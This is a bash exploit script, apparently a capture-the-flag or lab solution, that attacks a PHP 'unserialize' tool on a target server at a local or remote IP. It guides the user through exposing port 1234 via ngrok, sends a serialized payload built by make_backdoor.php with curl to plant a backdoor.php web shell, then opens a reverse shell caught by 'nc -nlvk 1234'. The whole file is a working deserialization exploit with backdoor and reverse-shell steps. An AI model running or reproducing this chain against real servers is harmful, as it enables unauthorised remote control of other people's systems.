#!/bin/bash

PORT=8004

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.105:'$PORT
elif [[ $# -ne 2 ]]
then
    echo "Usage:"
    echo $0" {local,remote}"
    echo "or"
    echo $0" <ip> <port>"
    exit 1
else
    URL=$1':'$2
fi

# Handy Tool
echo "Step 1: Forward your 1234 port using ngrok."
echo "Use the instructions from here: https://securiumsolutions.com/blog/reverse-shell-using-tcp/"
echo "Press any key to continue if you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Step 2: Update the ngrok host and port in \`./app.py\` and leave it running in a new terminal: \`python app.py\`."
echo "Press any key to continue after you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Step 3: Also update the ngrok host and port in \`./make_backdoor.php\`."
echo "Press any key to continue if you've done this."
echo
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Step 4: Now I am sending a request to the server to create a backdoor there..."
echo
backdoor_payload=$(php ./make_backdoor.php)
curl "$URL/?tool=unserialize&input=$backdoor_payload&submit=Submit" > /dev/null

echo "Step 5: Close the Flask app and open a new connection to your internal port using: \`nc -nlvk 1234\`"
echo "Press any key to continue if you did it."
while [ true ] ; do
    read -n 1
    if [ $? = 0 ] ; then
        break ;
    fi
done

echo "Finally: Now I am accessing the backdoor; check the \`nc\` terminal..."
curl "$URL""/backdoor.php"
